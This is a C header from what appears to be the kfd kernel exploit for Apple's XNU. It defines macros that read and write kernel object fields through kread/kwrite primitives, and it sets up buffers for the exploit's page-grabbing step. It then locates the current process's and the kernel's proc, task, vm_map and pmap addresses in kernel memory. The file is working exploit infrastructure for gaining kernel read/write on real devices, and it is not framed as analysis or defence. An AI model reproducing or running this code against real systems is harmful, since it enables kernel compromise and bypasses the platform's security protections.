/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef info_h
#define info_h

#include "info/dynamic_info.h"
#include "info/static_info.h"

/*
 * Note that these macros assume that the kfd pointer is in scope.
 */
#define dynamic_info(field_name)    (dynamic_system_info.field_name)
#define T1SZ_BOOT dynamic_info(device__T1SZ_BOOT)
#define ARM_16K_TT_L1_INDEX_MASK dynamic_info(device__ARM_TT_L1_INDEX_MASK)

#define dynamic_kget(field_name, object_kaddr)                                    \
    ({                                                                            \
        u64 tmp_buffer = 0;                                                       \
        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);         \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));    \
        tmp_buffer;                                                               \
    })

#define dynamic_kset(field_name, new_value, object_kaddr)                          \
    do {                                                                           \
        u64 tmp_buffer = new_value;                                                \
        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);          \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));    \
    } while (0)

#define static_kget(object_name, field_name, object_kaddr)                            \
    ({                                                                                \
        u64 tmp_buffer = 0;                                                           \
        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));        \
        tmp_buffer;                                                                   \
    })

#define static_kset(object_name, field_name, new_value, object_kaddr)                 \
    do {                                                                              \
        u64 tmp_buffer = new_value;                                                   \
        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));       \
    } while (0)

const char info_copy_sentinel[] = "p0up0u was here";
const u64 info_copy_sentinel_size = sizeof(info_copy_sentinel);

void info_init(struct kfd* kfd)
{
    /*
     * Initialize the kfd->info.copy substructure.
     *
     * Note that the vm_copy() call in krkw_helper_grab_free_pages() makes the following assumptions:
     * - The size of the copy must be strictly greater than msg_ool_size_small.
     * - The source object must have a copy strategy of MEMORY_OBJECT_COPY_NONE.
     * - The destination object must have a copy strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
     */
    kfd->info.copy.size = pages(4);
    assert(kfd->info.copy.size > msg_ool_size_small);
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
    for (u64 offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
    }

    /*
     * Initialize the kfd->info.env substructure.
     */
    kfd->info.env.pid = getpid();
    print_i32(kfd->info.env.pid);

    thread_identifier_info_data_t data = {};
    thread_info_t info = (thread_info_t)(&data);
    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
    kfd->info.env.tid = data.thread_id;
    print_u64(kfd->info.env.tid);

    usize size1 = sizeof(kfd->info.env.maxfilesperproc);
    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
    print_u64(kfd->info.env.maxfilesperproc);

    struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));
}

void info_run(struct kfd* kfd)
{
    timer_start();

    /*
     * current_task()
     */
    assert(kfd->info.kaddr.current_proc);
    if (dynamic_info(proc__task)) {
        kfd->info.kaddr.current_task = UNSIGN_PTR(dynamic_kget(proc__task, kfd->info.kaddr.current_proc));
    }
    else {
        kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + dynamic_info(proc__object_size);
    }
    print_x64(kfd->info.kaddr.current_proc);
    print_x64(kfd->info.kaddr.current_task);

    /*
     * current_map()
     */
    u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.current_task);
    kfd->info.kaddr.current_map = UNSIGN_PTR(signed_map_kaddr);
    print_x64(kfd->info.kaddr.current_map);
    
    /*
     * current_pmap()
     */
    u64 signed_pmap_kaddr = dynamic_kget(vm_map__pmap, kfd->info.kaddr.current_map);
    kfd->info.kaddr.current_pmap = UNSIGN_PTR(signed_pmap_kaddr);
    print_x64(kfd->info.kaddr.current_pmap);

    if (kfd->info.kaddr.kernel_proc) {
        /*
         * kernel_task()
         */
        if (dynamic_info(proc__task)) {
            kfd->info.kaddr.kernel_task = UNSIGN_PTR(dynamic_kget(proc__task, kfd->info.kaddr.kernel_proc));
        }
        else {
            kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + dynamic_info(proc__object_size);
        }
        print_x64(kfd->info.kaddr.kernel_proc);
        print_x64(kfd->info.kaddr.kernel_task);

        /*
         * kernel_map()
         */
        u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.kernel_task);
        kfd->info.kaddr.kernel_map = UNSIGN_PTR(signed_map_kaddr);
        print_x64(kfd->info.kaddr.kernel_map);

        /*
         * kernel_pmap()
         */
        u64 signed_pmap_kaddr = dynamic_kget(vm_map__pmap, kfd->info.kaddr.kernel_map);
        kfd->info.kaddr.kernel_pmap = UNSIGN_PTR(signed_pmap_kaddr);
        print_x64(kfd->info.kaddr.kernel_pmap);
    }

    timer_end();
}

void info_free(struct kfd* kfd)
{
    if(kfd->info.copy.src_uaddr) assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
    if(kfd->info.copy.dst_uaddr) assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
}

#endif /* info_h */
